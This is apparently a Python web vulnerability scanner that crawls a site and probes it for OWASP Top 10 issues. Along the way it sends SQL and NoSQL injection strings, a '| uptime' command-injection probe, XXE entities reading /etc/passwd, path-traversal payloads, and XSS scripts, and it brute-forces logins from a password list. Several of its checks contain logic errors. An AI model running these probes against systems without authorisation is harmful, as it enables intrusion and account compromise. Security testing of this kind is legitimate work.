import requests
import re
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup
import os
import queue
import socket
import ssl
from datetime import datetime
from configparser import ConfigParser

config_object = ConfigParser()
config_object.read("config.ini")


server_list = set()

linux_servers = ["apache", "nginx", "caddy", "openlitespeed", "hiawatha"]
windows_servers = ["IIS"]
mixed_servers = ["nodejs", "lighttpd"]


class OtherUser:

    def __init__(self, user, password, url=None):
        self.url = url
        self.session = requests.Session()
        self.http = self.session.post(
            config_object["WEBURL"]["login"],
            data={
                config_object["CREDENTIAL"]["username_field"]: user,
                config_object["CREDENTIAL"]["password_field"]: password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )

    def save_cookies(self, url):
        self.session.get(url)
        session_cookies = self.session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def get_sess_id(self):
        self.session.get(self.url)
        cookie_dict = self.save_cookies(self.url)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                session_id = cookie_dict[key]
                self.session.close()
                return session_id


class LoginTests:
    def __init__(self, user, login_url, pass_file, wrong_username, good_password, certain_wrong_passwd, logout_url):
        self.username = user
        self.password_found = False
        self.login_url = login_url
        self.logged_in = False
        self.pass_file = pass_file
        self.password = None
        self.wrong_un = wrong_username
        self.wrong_passwords = certain_wrong_passwd
        self.credentials_error_vuln = False
        self.good_password = good_password
        self.session = requests.session()
        self.logout_url = logout_url

        self.test_lockout()
        self.test_account_enum()
        self.test_brute_force()

    def brute_force(self):
        with open(config_object["FILE"]["password_dict"], "rb") as f:
            pass_list = f.readlines()
            f.close()
        pass_q = queue.Queue()
        if len(pass_list):
            for passwd in pass_list:
                try:
                    passwd = passwd.decode("utf-8").rstrip()
                    pass_q.put(passwd)
                except Exception as e:
                    print(e)
                    passwd = passwd.decode("latin-1").rstrip()
                    pass_q.put(passwd)

        for pass_word in pass_q.queue:
            http = requests.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: pass_word,
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
            if http.url == config_object["WEBURL"]["index"]:
                self.password = pass_word
                self.password_found = True
                return 1
        return 0

    def account_enumeration(self):
        print("\nChecking for Account Enumeration and Possible Guessable Users...")
        wrong_password_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_password_res_content = str(wrong_password_res.content)
        wrong_username_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.wrong_un,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_username_req_content = str(wrong_username_res.content)
        if wrong_username_req_content != wrong_password_res_content:
            return 1
        return 0

    def get_correct_password(self):
        if self.password_found:
            return self.password
        return False

    def check_login_attempts(self, n):
        self.session = requests.session()
        for i in range(n):
            self.session.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords[0],
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
        correct_login = self.session.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        if correct_login.url == config_object["WEBURL"]["index"]:
            self.session.post(self.logout_url)
            self.session.close()
            print("\n[!!!!-!!!!] Wrong Password Lock Out Mechanism not triggered after " + str(n) + " times")
            return 1
        return 0

    def test_lockout(self):
        if self.check_login_attempts(int(config_object["TEST"]["lock_out_mechanism_attempts"])):
            print("[!!!!-!!!!] Weak Lockout Mechanism found for a number of invalid password attempts")
        else:
            print("OK! Wrong Password Lock Out Mechanism detected")

    def test_account_enum(self):
        if self.account_enumeration():
            print(
                "\n[!!!!!-!!!!!!] It s possible that the login error message provides useful information about login credentials!"
                " Make sure the error message is the same for any invalid credentials case!"
            )
        else:
            print("OK! No accounts can be enumerated")

    def test_brute_force(self):
        if self.brute_force():
            print("\n\n[!!!!---!!!!] Brute Force attack successful!!" + "\nUsername: " + self.username + "\n" + "Found password: " + self.password + "\n\n")


class Scanner:
    def __init__(self, url, ignored_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.ignored_links = ignored_links
        self.cookie_list = []
        self.visited = []

    # Utilities ---------@
    def extract_links(self, url):
        response = self.session.get(url)
        return re.findall(
            '(?:href=")(.*?)"',
            str(response.content)
        )

    def spider(self, url=None):
        if url is None:
            url = self.target_url
        extracted_links = self.extract_links(str(url))
        for extracted_link in extracted_links:
            extracted_link = urllib.parse.urljoin(url, extracted_link)
            if "#" in extracted_link:
                extracted_link = extracted_link.split("#")[0]
            if self.target_url in extracted_link and extracted_link not in self.target_links and extracted_link not in self.ignored_links:
                self.target_links.append(extracted_link)
                self.spider(extracted_link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, "html.parser", from_encoding="iso-8859-1")
        return parsed_html.findAll("form")

    def check_response(self, url):
        if self.session.post(url).status_code == 200:
            return True
        elif self.session.get(url).status_code == 200:
            return True
        return False

    def submit_form(self, form, value, url, files=None):  # needs changing
        action = form.get("action")
        post_url = urllib.parse.urljoin(url, action)
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data_dict = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")

            if input_type == "text":
                input_value = value
            post_data_dict[input_name] = input_value
        if method.lower() == "post":
            return self.session.post(post_url, files=files, data=post_data_dict)
        return self.session.get(post_url, params=post_data_dict)

    def save_cookies(self, url, session=None):
        if session is None:
            self.session.get(url)
            session_cookies = self.session.cookies
        else:
            session_cookies = session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def check_hidden_path(self, path):
        response = self.session.get(self.target_url + path)
        if response == 200:
            return True
        return False

    def get_headers(self, url):
        return self.session.get(url).headers

    def get_content(self, url, session=None):
        if session is None:
            response = self.session.get(url)
        else:
            response = session.get(url)
        return response

# Get Info
    def fingerprint(self, url):
        global server_list
        header_for_link = self.get_headers(url)
        server_list.add(header_for_link["Server"])

# Vulnerabilities

    # A1:2017-Injection

    def test_sql(self, form, url):
        sql_no_payload = ""
        response_wh_payload = self.submit_form(form, sql_no_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        sql_detect_payload = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1))," \
                             "SLEEP(0.5))/*'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'*/"  # detectify https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
        response_w_payload = self.submit_form(form, sql_detect_payload, url)
        sql_response_time = response_w_payload.elapsed.total_seconds()

        if sql_response_time > normal_response_time and sql_response_time > 1:
            print("Expected seconds to load: " + str(normal_response_time))
            print("Got: " + str(sql_response_time))
            return True
        return False

    def test_nosql(self, form, url):
        no_nosql_payload = ""
        response_wh_payload = self.submit_form(form, no_nosql_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        nosql_detect_payload = "';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"  # https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/
        response_w_payload = self.submit_form(form, nosql_detect_payload, url)
        nosql_response_time = response_w_payload.elapsed.total_seconds()

        if nosql_response_time > normal_response_time and nosql_response_time > 1:
            print("\nExpected seconds to load: " + str(normal_response_time))
            print("\nGot: " + str(nosql_response_time) + "\n")
            return True
        return False

    def code_exec(self, form, url):
        code_exec_script = "| uptime"
        response = self.submit_form(form, code_exec_script, url)
        return re.findall('\d\d:\d\d:\d\d', str(response.content))

    # A2:2017-Broken Authentication:
    # Above Class(LoginTestsVulns)

    def test_role_definition_cookie(self, url):
        cookie_dict = self.save_cookies(url)
        if "isadmin" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or\
                    str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or\
                    str(cookie_dict.lower()["admin"]).lower() == "true" or\
                    str(cookie_dict.lower()["administrator"]).lower() == "true":
                return 1
        if "role" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["role"]).lower() == "admin" or\
                    str(cookie_dict.lower()["role"]).lower() == "administrator" or\
                    str(cookie_dict.lower()["role"]).lower() == "manager" or\
                    str(cookie_dict.lower()["role"]).lower() == "auditor" or\
                    str(cookie_dict.lower()["role"]).lower() == "mod":
                return 1
        return 0

    def search_paths(self):
        print("\nScanning for hidden paths...\n")
        with open(config_object["FILE"]["hidden_url_dict"], "r") as file:
            paths = file.read().split("\n")
        for path in paths:
            try:
                if self.target_url + path not in self.visited and\
                        self.target_url + path not in self.ignored_links and\
                        self.target_url + path not in self.target_links and\
                        "logout" not in self.target_url + path:
                    response = self.session.get(self.target_url + path)
                    if response.status_code == 200:
                        link_visited = self.target_url + path
                        self.visited.append(str(link_visited))
            except Exception as e:
                print(e)
                continue
        if self.visited:
            return 1
        return 0

    def test_role_definition_directories(self):
        hidden_dir = []
        for link in self.visited+self.target_links:
            link = link.lower()
            if "/admin" in link or "/administrator" in link or "/mod" in link or "/moderator" in link:
                hidden_dir.append(link)
        if hidden_dir:
            return hidden_dir
        return 0

    def check_session_url(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid=" or "sessionid=" in str(url).lower():
            print("\n[?????-!!!!!]Possible SessionID Hijacking for link:" + url)
            print("\nSearching for proper SessionID storage on cookies...")
            if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
                if not str(cookie_dict.lower()["secure"]) or str(cookie_dict.lower()["httpOnly"]):
                    print("\n[!!!!!-!!!!!!]Cookie Session not secure...(HTTP only)")
                    return True
        return False

    def test_browser_cache_weakness(self, url):
        response = self.session.get(url)
        if "Cache-Control" in str(response.headers):
            if (response.headers["Cache-Control"] != "no-store" and
                response.headers["Cache-Control"] == "no-cache, must-revalidate") or\
                    (response.headers["Cache-Control"] == "no-store" and
                     response.headers["Cache-Control"] != "no-cache, must-revalidate"):
                return False
        return True

    # A3:2017-Sensitive Data Exposure
    # checking certificate...
    def check_tls(self, to_check=None):  # needs change
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target_url, 443)) as sockk:
                with context.wrap_socket(sockk, server_hostname=self.target_url) as tlssock:
                    y = getattr(tlssock, to_check)
                    return y()
        except Exception as e:
            print("Something went wrong in checking TLS. Error: ", str(e))
            pass

    def check_tls_version(self):
        print("\nChecking TLS extensions version...")
        try:
            version = self.check_tls("version")
            if version:
                found = True
            else:
                found = False
            legacy_tls = [x.strip() for x in config_object["TLSVERSION"]["tlsversion"].split(',')]
            for legacy in legacy_tls:
                if str(version).lower() == legacy:
                    print(version.lower)
                    print(
                        "[!!!!-!!!!] Found Legacy Version for TLS extension, this version contains cryptographic weaknesses: " + str(
                            version))
            if not found:
                print("[!!!-!!!] Cannot find the version of the TLS extension...")
        except Exception as e:
            print("[!!!-!!!] Cannot find the version of the TLS extension. Error: ", e)
            pass

    def check_tls_validity(self):
        try:
            print("\nChecking Validity of Digital Certificate...")
            sep = " "
            stripped = self.check_tls("getpeercert")["notAfter"].split(sep, -1)[:-1]
            str1 = " "
            good_date = str1.join(stripped)
            date_time_obj = datetime.strptime(good_date, '%b %d %H:%M:%S %Y')
            print("Certificate expires in: ", date_time_obj-datetime.today())
        except Exception as e:
            print("[!!!-!!!] Cannot find validity for the TLS extension. Error: ", e)
            pass

    def check_secure_tag_cookie_sessid(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
            if "secure" or not "httponly" not in str(cookie_dict).lower() or not "secure" and not "httponly" in str(cookie_dict).lower():
                return True
        return False

    @staticmethod
    def check_form_action(form):
        action = form.get("action")
        if "http" in action and "https" not in action:
            return True
        return False

    # A4:2017-XML External Entities (XXE) https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16

    def detect_xml(self, url):
        response = self.session.get(url)
        if ".xml" in url.lower() or "?xml" in str(response.text).lower():
            return 1
        return 0

    def inject_xml(self, url):
        list_of_xee = ['<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://www.google.com"> ]>', '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://www.google.com"> %xxe; ]>']
        if self.detect_xml(url):
            for xee in list_of_xee:
                response = self.session.post(url, data=xee)
                if response.url == 'https://www.google.com':
                    return 1
                elif 'root' == str(response.text).lower():
                    return 1
            return 0

    # A5:2017-Broken Access Control
        # Directory Traversal File Include # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi
    def lfi_script(self, url, script):
        lfi_script = script
        url = url.replace("=", "=" + lfi_script)
        if "root:" in self.get_content(url).text.lower():
            return 1
        return 0

    def rfi_script(self, url, script):
        rfi_script = script
        url = url.replace("=", "=" + rfi_script)
        if self.get_content(url).url != url:
            return 1
        return 0

    def test_lfi_directory_transversal(self, url):
        if self.local_file_inclusion(url):
            return 1
        if "=" in url:
            if server_list in linux_servers or server_list in mixed_servers:
                if self.lfi_script(url, "../../../etc/passwd") or \
                        self.lfi_script(url, "../../../etc/passwd%00") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd%00") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00") or \
                        self.lfi_script(url, "....//....//etc/passwd") or \
                        self.lfi_script(url, "..///////..////..//////etc/passwd") or \
                        self.lfi_script(url, "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"):
                    return 1
            elif server_list in windows_servers in mixed_servers:
                if self.lfi_script(url, "../") or \
                        self.lfi_script(url , "..\/") or \
                        self.lfi_script(url , "%2e%2e%2f") or \
                        self.lfi_script(url , "%252e%252e%252f") or \
                        self.lfi_script(url , "%c0%ae%c0%ae%c0%af") or \
                        self.lfi_script(url , "%uff0e%uff0e%u2215") or \
                        self.lfi_script(url , "%uff0e%uff0e%u2216") or \
                        self.lfi_script(url , "..././"):
                    return 1
            if self.rfi_script(url, "https://www.google.com/"):
                return 1
        return 0

    def test_cookie_directory_transversal(self, url):
        # self.session.get(url)
        dummy_session = OtherUser(config_object["CREDENTIAL"]["username_2"], config_object["CREDENTIAL"]["known_password_2"]).session
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            dummy_session.cookies.set(key, "../")
            if self.get_content(url, dummy_session).url is not url:
                dummy_session.close()
                return 1
        return 0

        # Bypassing Authorization Schema
        # Horizontal

    def test_bypass_auth(self, url):
        first_user_session_id = None
        second_user_session_id = None
        response_first_user = None
        response_second_user = None
        dummy_user = OtherUser(config_object["CREDENTIAL"]["username_2"],
                               config_object["CREDENTIAL"]["known_password_2"], url)
        dummy_session = dummy_user.session
        dummy_session.get(url)
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                first_user_session_id = cookie_dict[key]
            else:
                return 0

        if first_user_session_id:
            second_user_session_id = dummy_user.get_sess_id()
        if second_user_session_id:
            data = {
                config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"]
            }
            response_first_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
            for key in key_list:
                if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                    dummy_session.cookies.set(key, second_user_session_id)
            response_second_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
        if response_first_user and response_second_user:
            if str(response_first_user.text) == str(response_second_user.text):
                return 1
        return 0

        # Vertical ~SOON~

        # Special Request Header

    def test_special_req_header(self, url):
        response_wo_headers = self.session.get(url)
        response_w_x_original = self.session.get(url, headers={"X-Original-URL": "/donotexistrandomstring1238123"})
        response_w_x_rewrite = self.session.get(url, headers={"X-Rewrite-URL": "/donotexistrandomstring1238123"})
        if response_wo_headers.status_code == 404 or response_w_x_original.status_code == 404 or response_w_x_rewrite.status_code == 404:
            return 1
        return 0

    def test_xss_in_link(self, url):
        xss_test_script = "<sCript>alert('test')</sCRiPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCript>alert('test')</sCRiPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    @staticmethod
    def create_file_dir(subdir):
        filenames = ["filefortest.php", "fIleForTest.Php.JpEG", "fiL3ForTest.hTMl.JPG"]
        here = os.path.dirname(os.path.realpath(__file__))
        if not os.path.exists(os.path.join(here, subdir)):
            os.mkdir(os.path.join(here, subdir))
        for filename in filenames:
            if not os.path.isfile("./" + filename):
                filepath = os.path.join(here, subdir, filename)
                test_file = open(filepath, 'w+')
                test_file.write("This is unharmful content to be uploaded to the site")
                test_file.close()

    def file_upload(self, form, url):
        is_file = False
        inputs_list = form.find_all("input")
        for inputs in inputs_list:
            if inputs.get("type") == "file":
                is_file = True
        if is_file is True:
            self.create_file_dir("Files")
            cur_path = os.path.join(os.path.dirname(__file__), 'Files')
            dir_listing = os.listdir(cur_path)
            os.chdir(cur_path)
            for i in dir_listing:
                path_for_file = os.path.relpath('..\\Files\\' + i, cur_path)
                f = open(path_for_file, 'rb')
                files = {'uploaded': f}
                if self.submit_form(form, "value", url, files).status_code == 200:
                    return True
            return False

    def local_file_inclusion(self, url):
        lfi_script = "~"
        url = url.replace("=", "=" + lfi_script)
        if self.check_response(url):
            return True
        return False

    def run_scanner(self):
        session_id = ""
        prev_session_id = ""
        potential_role_definition = []
        links_vulnerable_to_lfi = []
        links_without_secure_cookie_with_sessid = []
        browser_cache_weakness_links = []
        lfi_directory_transversal_links = []
        cookie_directory_transversal_links = []
        bypass_authorization_links = []
        special_header_links = []

        self.check_tls_version()
        self.check_tls_validity()
        self.spider()

        if self.search_paths():
            print("Possible Hidden Paths Found:")
            print(*self.visited, sep="\n")
        # role def admin dir
        has_admin_directories = self.test_role_definition_directories()
        if has_admin_directories:
            print("\n[!!!!---?????] Possible Admin Path discovered for links:")
            for link in has_admin_directories:
                print(link)
        visible_links = len(self.target_links)
        invisible_links_length = len(self.visited)
        print("\nVisible Links Length:", visible_links, "\nHidden Links Length:", invisible_links_length)
        final_list = self.target_links + self.visited
        print("\n[?!?!?!--?!?!?!?!] Testing now for NOT HIDDEN links...\n")
        for count, link in enumerate(final_list):
            try:
                if count-1 == visible_links:
                    print("\n[?!?!?!?!--?!?!?!?!?!] Testing now for HIDDEN links...\n")
                forms = self.extract_forms(link)
                for form in forms:
                    print("[+] Testing form in " + link)
                    is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                    if is_vulnerable_to_xss:
                        print("\n[!!!!--!!!!] XSS Vulnerability discovered: " + str(link) + ". Following form vulnerable: \n" + str(form) + "\n\n")

                    is_vulnerable_to_file_upload = self.file_upload(form, link)
                    if is_vulnerable_to_file_upload:
                        print("\n[!!!!---!!!!] File Upload Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_code_exec = self.code_exec(form, link)
                    if is_vulnerable_to_code_exec:
                        print("\n[!!!!---!!!!] Code Execution Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_sql_injection = self.test_sql(form, link)
                    if is_vulnerable_to_sql_injection:
                        print("\n[!!!!---?????] Possible SQL Injection Vulnerability on: " + str(link) + " on form \n" + str(form) + "\n\n")

                    is_vulnerable_to_nosql_injection = self.test_nosql(form, link)
                    if is_vulnerable_to_nosql_injection:
                        print("\n[!!!!---?????] Possible NOSQL Injection Vulnerability on: " + str(
                            link) + " on form \n" + str(form) + "\n\n")

                    sensitive_over_form = self.check_form_action(form)
                    if sensitive_over_form:
                        print("\n[!!!!---?????] Sensitive Information might be transferred over unsecure form: " + str(
                            link) + "\n Form: \n" + str(form) + "\n\n")

                self.fingerprint(link)

                if self.test_browser_cache_weakness(link):
                    browser_cache_weakness_links.append(link)

                if self.check_secure_tag_cookie_sessid(link):
                    links_without_secure_cookie_with_sessid.append(link)

                if self.inject_xml(link):
                    print("\n[!!!!!-!!!!!]XEE Vulnerability found on link: ", link)

                if self.test_role_definition_cookie(link):
                    potential_role_definition.append(link)

                if self.test_lfi_directory_transversal(link):
                    lfi_directory_transversal_links.append(link)

                if self.test_cookie_directory_transversal(link):
                    cookie_directory_transversal_links.append(link)

                # if self.test_bypass_auth(link): # cant be tested yet
                #     bypass_authorization_links.append(link)

                if self.test_special_req_header(link):
                    special_header_links.append(link)

                if "=" in link:
                    print("[+] Testing " + link)
                    is_vulnerable_to_xss = self.test_xss_in_link(link)
                    if is_vulnerable_to_xss:
                        print("\n[!!!!---!!!!] XSS discovered: " + str(link) + "\n\n")

                    is_vulnerable_to_lfi = self.local_file_inclusion(link)
                    if is_vulnerable_to_lfi:
                        links_vulnerable_to_lfi.append(link)

                    if "sid=" in str(link).lower():
                        session_id = link.split("sid=", 1)[1]
                    elif "sessionid=" in str(link).lower():
                        session_id = link.split("sessionid=", 1)[1]
                    if session_id != prev_session_id:
                        if self.check_session_url(link):
                            prev_session_id = session_id
                            print("\n[!!!!!!-!!!!!!]SessionID Hijack Vulnerability found")
            except Exception as e:
                print(e)
                continue

        if not potential_role_definition:
            print("\n\n[!!!!---?????] Possible non-existing cookies with role storage...")
        else:
            print("\n[!!!!---?????] Possible Role Definition Vulnerability on Cookies for links:\n")
            print(*potential_role_definition, sep="\n")

        if links_without_secure_cookie_with_sessid:
            print("\n[!!!!---!!!!] Session ID Set in Cookie but cookie is not secure. It can be sent over unencrypted channels (HTTP) Links:\n")
            print(*links_without_secure_cookie_with_sessid, sep="\n")
            print("End of Insecure Cookie With Session ID SET\n")

        if browser_cache_weakness_links:
            print("\n[!!!!---!!!!] Browser Cache Weakness Vulnerability on links:\n")
            print(*browser_cache_weakness_links, sep="\n")
            print("End of Browser Cache Weakness Vulnerability\n")

        if links_vulnerable_to_lfi:
            print("\n[!!!!---!!!!] Local File Inclusion Vulnerability on links:\n")
            print(*links_vulnerable_to_lfi, sep="\n")
            print("End of Local File Inclusion\n")

        if lfi_directory_transversal_links:
            print("\n[!!!!---!!!!] Local File Inclusion Directory Transversal on links:\n")
            print(*lfi_directory_transversal_links, sep="\n")
            print("End of Local File Inclusion Directory Transversal\n")

        if cookie_directory_transversal_links:
            print("Cookies Local File Inclusion Directory Transversal  on links:\n")
            print(*cookie_directory_transversal_links, sep="\n")
            print("End of Cookie Local File Inclusion Directory Transversal\n")

        if bypass_authorization_links:
            print("\n[!!!!---!!!!] Bypassing Authorization Vulnerability:\n")
            print("Horizontal Bypassing Authorization on links:\n")
            print(*bypass_authorization_links, sep="\n")

        if special_header_links:
            print("Special Request Header Handling on links:")
            print(*special_header_links, sep="\n")
            print("End of Bypassing Authorization Vulnerability\n")

        if server_list:
            print("\nServer/s Found: ")
            print(*server_list, sep="\n")
